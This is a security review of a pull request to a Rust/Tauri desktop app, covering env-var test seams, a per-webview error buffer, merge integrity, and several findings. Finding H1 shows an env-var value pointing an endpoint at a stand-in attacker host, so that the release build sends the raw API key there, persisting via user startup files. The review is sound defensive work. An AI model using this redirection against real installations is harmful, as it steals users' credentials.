# Security review: PR #244 `fix/ui-bug-sweep` (round 2)

Base `feat/new-app-ui`, HEAD `8c03a4c` (merge of the base into the branch).
Scope: the 22-file diff plus the merge resolutions in `8c03a4c`.

## Summary

The three surfaces the brief singled out are clean on the questions asked.

- **`crates/core/src/env.rs`.** The new `tool_path_override` seam is
  release-neutral: it gates on `test_home_override()`, which goes through
  `env::test_seam` (`crates/core/src/env.rs:16-23`), which returns `None` under
  `cfg!(debug_assertions)` being false. In a release build
  `tool_path_override(var)` is byte-for-byte the old `env_path(var)`, so the
  published overrides still win and the seam cannot be turned on by an
  attacker-controlled variable. No traversal surface is added: the resolvers
  return the override path verbatim, exactly as before, and every caller is
  same-user by construction. The new test is load-bearing - verified by
  reverting `hermes_config_dir` to `env_path("HERMES_HOME")`, which fails it
  with "HERMES_HOME punched through the test home"; reverted immediately.
- **`src-tauri/src/lib.rs`.** The per-label buffer is sound as an isolation
  mechanism (details below). Nothing credential-bearing can reach it on the
  three contexts that get rendered, and the label key cannot be forged from JS.
- **`crates/core/src/provider.rs`.** The two new unknown-slug guards
  (`:969`, `:1158`) fail *closed*: an unresolvable slug is dropped from the
  snapshot without enabling anything, so the residue left behind is a route
  that stays off, never one that stays on. `RESTORE_SKIP_MEMBERS` is still
  cleared only when the provider queue empties, on both paths.
- **Merge `8c03a4c`, `src-tauri/src/lib.rs`.** Nothing lost from either side.
  `git diff 807872a 8c03a4c` carries the base's whole contribution
  (`SolveOutcome` import, `security_feed_history_ok`, the
  `set_signed_out_deliberately` pair, `reset_for_account_change`, the incognito
  challenge window, the `unminimize` platform widening) and
  `git diff 7dc9b2f 8c03a4c` carries exactly the branch's
  (`HashMap` import, the buffer rework, `request_recovery_details`, the new
  test). Both imports are present in HEAD; the union is complete.

Verified non-issues worth recording so round 3 does not re-derive them:

- The one webview in this app that loads third-party content is `cf-challenge`
  (`src-tauri/src/lib.rs:3427`, `WebviewUrl::External` at `:3534`, chatgpt.com).
  It cannot reach `drain_backend_errors` or any other application command:
  tauri 2.11.2 checks the ACL whenever the origin is not local
  (`tauri-2.11.2/src/webview/mod.rs:1820-1826`, "remote content can never reach
  custom commands unless an explicit `remote` capability has been configured"),
  and no capability in `src-tauri/capabilities/` declares `remote`. It also
  never receives a broadcast payload: `emit` only evals into webviews that
  registered a JS listener for that event
  (`tauri-2.11.2/src/event/listener.rs:282-290`), and it has neither
  `core:event:allow-listen` nor a remote grant.
- `window.label()` in `drain_backend_errors` is server-derived
  (`tauri-2.11.2/src/window/mod.rs:1091-1096`, `CommandArg` reads
  `command.message.webview().window()`), not taken from the invoke payload, so
  one webview cannot name another's label.
- Raw backend strings do not leak off-box. `forwardBackendErrors` sends only
  `classifyError(...).title` (`src/lib/backendErrors.ts:47` into
  `src/lib/analytics.ts:229-241`), and every title in `src/lib/errors.ts` is a
  fixed constant or `titles[context]`; the raw text renders locally behind a
  `<details>` disclosure (`src/components/gc/banners.tsx:450-470`).
- None of the three rendered contexts can carry a credential.
  `restore_routing` / `provider_restore` / `provider_reconcile`
  (`src/lib/backendErrors.ts:25-29`) resolve to `provider.rs` `?` paths whose
  `with_context` strings interpolate slugs, domains and paths only; the one
  place a key touches an error type
  (`crates/core/src/proxy/mod.rs:1454`) relies on `http`'s
  `InvalidHeaderValue`, which by design does not print the value, and is not on
  a reported context.
- `RoutePair` becoming DEV-only (`src/components/gc/dialogs.tsx:102-104`)
  *reduces* disclosure: shipped builds stop printing the live relay and engine
  URLs into a dialog.

Verification run: `cargo clippy --workspace --all-targets -- -D warnings`
clean; `cargo test -p gate-connect-core --lib env::` (11), `--lib provider::`
(17), `--test disconnect_zero_residue` (12), `src-tauri --lib
each_shell_drains` (1), and the five changed vitest files (88) all pass.

## Round 1 verification

Only `src/TrayApp.tsx:298` was security-relevant. The other ten are correctness
or test-quality and are out of this lens.

**Verified fixed, as a race.** `PENDING_BACKEND_ERRORS` is now
`Mutex<Option<HashMap<String, Vec<BackendError>>>>` (`src-tauri/src/lib.rs:1773`),
`report_backend_error` queues a clone per label in `ERROR_SINK_LABELS`
(`:1777`, `:1788`), and `drain_backend_errors` takes only its own label's vec
(`:1833-1841`). The destructive-read race is gone: neither shell can consume the
other's copy.

**No unbounded growth.** The map is keyed only from the fixed two-element
`ERROR_SINK_LABELS` const, so it can never hold more than two vecs, and each
evicts its oldest at 32 (`:1789-1791`). Worst case is 64 buffered entries. A
label absent from the const queues nothing at all, so a transient window cannot
open a buffer.

**No cross-webview read.** Consumption is per label and the key is not
forgeable (see above). Note that *content* is deliberately duplicated to both
labels, so both shells see every failure - that is the fix, not a leak, and both
webviews are the same local bundle at the same trust level. The two draining
labels match the shells exactly: `src/main.tsx:57-85` renders `TrayApp` for
`tray`, `NewUiApp`/`App` for `main`, and `Onboarding` for `onboarding`, which
does not drain.

**The test is load-bearing.** Narrowing `:1788` to `for label in ["main"]` fails
`each_shell_drains_its_own_copy_of_a_failure` with the author's own message,
"the tray must still see it". Reverted immediately; `git status` clean.

**Not fixed: the mirror case.** Round 1 named two halves. The second one -
`actionError` is never cleared on hide, so a failure taken by the hidden tray
surfaces later as an unexplained banner - was acknowledged in the reply and not
addressed. It is now worse than before, because the tray no longer needs to win
a race to get a copy. See finding M1.

## New findings

### H1 - Five `GATE_CONNECT_TEST_*` endpoint seams are honored in release builds, and each one exfiltrates the raw credential

*Pre-existing, not introduced by this PR. Raised here because it is the direct
answer to the brief's "can the seam be enabled at runtime by an
attacker-controlled env var", and because `env.rs` is the file this PR touches.*

`docs/security-notes-loopback.md` states that `GATE_CONNECT_TEST_*` seams
"are honored only in debug builds (`env::test_seam`); a release binary ignores
them loudly", and the header comment at `crates/core/src/env.rs:9-17` gives the
reason: "an attacker who can set a production process's environment could
otherwise swap those out wholesale". Five endpoint overrides do not use that
helper and read `std::env::var_os` directly, so they are live in a shipped
build:

- `crates/core/src/activity.rs:44` (`GATE_CONNECT_TEST_ACTIVITY_ENDPOINT`)
- `crates/core/src/activity.rs:53` (`GATE_CONNECT_TEST_TOOL_EVENTS_ENDPOINT`)
- `crates/core/src/activity.rs:65` (`GATE_CONNECT_TEST_INSTALLATIONS_ENDPOINT`)
- `crates/core/src/gate_models.rs:26` (`GATE_CONNECT_TEST_CREDITS_ENDPOINT`)
- `crates/core/src/gate_models.rs:51` (`GATE_CONNECT_TEST_GATE_MODELS_ENDPOINT`)

Their four siblings do it correctly and are the template:
`audit.rs:96`, `org.rs:43`, `oauth.rs:155`, `security_feed/mod.rs:255` all call
`crate::env::test_seam`.

The consequence is disclosure, not just redirection. Each of those URLs is
handed to `gateway_api::call_json`, which attaches the live credential
unconditionally: `crates/core/src/gateway_api.rs:172-173` sends
`x-gate-authorization: Bearer <token>` plus `x-gate-org-id` in OAuth mode, and
`:181` sends `x-gate-api-key: <account.api_key>` - the raw `sk-gw-` key - in
API-key mode. There is no scheme or host check on the parsed URL
(`gateway_api.rs:123`), so `GATE_CONNECT_TEST_CREDITS_ENDPOINT=http://attacker/`
ships the key in cleartext to an arbitrary host on the next credits read, which
the app performs whenever an app pane is open.

This is a strict escalation past the documented posture. `security-notes-loopback.md`
concedes same-user spend on macOS/Windows and bounds it explicitly: "Blast
radius in both cases is spend, not theft: the raw key is not disclosed." These
five seams disclose it, and they do so from a persistent user-writable location
(`~/.zshenv`, a launchd plist, Windows user environment) rather than for the
lifetime of one process, so a single write harvests the credential on every
later launch.

Fix is mechanical: swap `std::env::var_os` for `crate::env::test_seam` at the
five sites. Not a blocker for merging this PR - it is untouched by the diff -
but it should be its own commit before the next release, and the `env.rs`
header comment should stop implying the invariant already holds.

### M1 - The tray now latches every routing-down failure while hidden, and never clears it

New in this PR. `src/TrayApp.tsx:298-307` adds a drain sweep that runs on mount
and on every `backend-error-pending`, and writes the result into `actionError`.
The tray webview is created hidden at launch and never destroyed, so the sweep
runs against the startup auto-enable's failures before the user has opened
anything, and the component is never unmounted. The visibility handler at
`src/TrayApp.tsx:321-327` clears `setMenuOpen(false)` on hide and nothing else -
`actionError` is cleared only by the banner's own dismiss
(`src/TrayApp.tsx:933`) or by starting a new action (`:465`, `:803`).

Before this PR the tray had no drain, so this state could not exist. Round 1
predicted it as a race outcome; the per-label fix removes the race by giving the
hidden tray its own copy of *every* routing-down failure, which converts an
intermittent surprise into a certainty: any `restore_routing` /
`provider_restore` / `provider_reconcile` failure - including one raised at
startup, hours earlier, and already reported and dismissed in the main window -
is sitting in an `ErrorBanner` the first time the popover is opened, over a
popover the user opened for an unrelated reason.

Security-adjacent rather than a vulnerability: the latched banner carries the
raw backend string behind its Details disclosure with a "Copy details" button
(`src/components/gc/banners.tsx:463-478`), so machine detail about the user's
filesystem and gateway is presented at an arbitrary later moment, detached from
the action that produced it. The principled fix matches what the popover already
does for `menuOpen`: clear `actionError` on `document.hidden` in the same
handler, or gate the sweep on the popover being visible.

### M2 - Every backend failure is now reported to analytics twice

New in this PR, and the other consequence of duplicating rather than routing.
`forwardBackendErrors` calls `trackError` for *every* entry it drains
(`src/lib/backendErrors.ts:45-51`), with no dedupe. `report_backend_error` now
queues one copy per label (`src-tauri/src/lib.rs:1788-1797`), and both draining
shells run a live PostHog client - `initAnalytics()` is called at module scope
in the shared entry point (`src/main.tsx:28`), which
`src-tauri/capabilities/tray.json` itself notes is why the popover needs
`core:app:allow-version`.

So each backend failure now produces two `error_shown` events and two
`captureException` records (`src/lib/analytics.ts:235-241`) where it previously
produced one, from whichever shell won the take. That is doubled error volume on
a consented telemetry stream and a silently wrong denominator for anyone
triaging by count. The buffer is the right place to fix it - either send to
analytics from one label and display from both, or dedupe on
`(context, message)` in `forwardBackendErrors`.

### M3 - `disconnect_zero_residue.rs`'s new seam pin is a duplicate of a line already there, under a comment claiming it is the protection

`crates/core/tests/disconnect_zero_residue.rs:87` adds
`set_var("GATE_CONNECT_TEST_HOME", &dir)` with an eleven-line comment saying it
is "the only thing that stops an ambient `CODEX_HOME` or `OPENCODE_CONFIG_DIR` -
Orca exports both - from punching straight through the temp home. Without it
this suite read and OVERWROTE the developer's real Codex `auth.json` and
`config.toml`."

The base already set that variable. `git show
origin/feat/new-app-ui:crates/core/tests/disconnect_zero_residue.rs` has it at
its line 56, with `prev_test_home` saved at line 52 and restored at line 78. In
HEAD both pairs are present and identical: the variable is read twice
(`:75`, `:78`), set twice to the same value (`:87`, `:90`), and restored twice
from two fields holding the same string (`:111`, `:114`). The new `prev_seam`
field (`:55`) is dead weight, and the second `restore` is a no-op.

The line is harmless. The comment is not: it credits a protection to a line that
does not provide it, on the one test file whose job is proving that a disconnect
leaves nothing behind, and it invites the next reader to conclude that removing
the older line is safe cleanup. Either drop the duplicate and move the reasoning
onto the existing line, or say plainly that the pin was already there and this
commit only documented why.

### L1 - "Every override goes through here now" is narrower than it reads

`crates/core/src/env.rs:250-252` says "Every override goes through here now, so
the next one added cannot forget it." True for the eight *tool-dir path*
overrides, and the new test covers all eight. Two other env-driven per-user
inputs do not route through it:

- `crates/core/src/integrations/opencode.rs:706` reads
  `OPENCODE_CONFIG_CONTENT` (OpenCode's own real variable) directly. Read-only
  and parsed with `serde_json::from_str` into a `Map` with `.ok()?`, so there is
  no unsafe-deserialization or write hazard - but an ambient value still
  influences what the suite believes an administrator configured, under a set
  test home.
- `crates/core/src/proxy/ca_linux.rs:343` resolves the Chromium NSS database
  candidates from bare `std::env::var_os("HOME")` rather than `env::home()`, so
  it is the one per-user path the seam does not redirect. Theoretical today: the
  `certutil` binary has its own override (`ca_linux.rs:383-397`) and it is
  `#[cfg(test)]`, so an integration test cannot set it, and the one integration
  suite that reaches this area (`disconnect_zero_residue`) scopes `HOME` as well.
  Worth knowing before anyone writes a Linux CA-trust integration test that
  scopes only the seam, because the write in question would install a MITM root
  into the developer's real browser trust store.

### L2 - The new buffer test mutates a process global with no lock

`src-tauri/src/lib.rs:5527-5562` resets `PENDING_BACKEND_ERRORS` to `None`, calls
`report_backend_error`, and then asserts exact counts of 1. It is the only test
in that binary that touches the global today, so it passes deterministically.
Any second test that reports a backend error, or any future parallel test that
does, flakes it in whichever direction the scheduler picks. The repo already has
the pattern for this in `env::path_env_lock`, whose own doc comment explains the
libtest-threads problem this is exposed to.
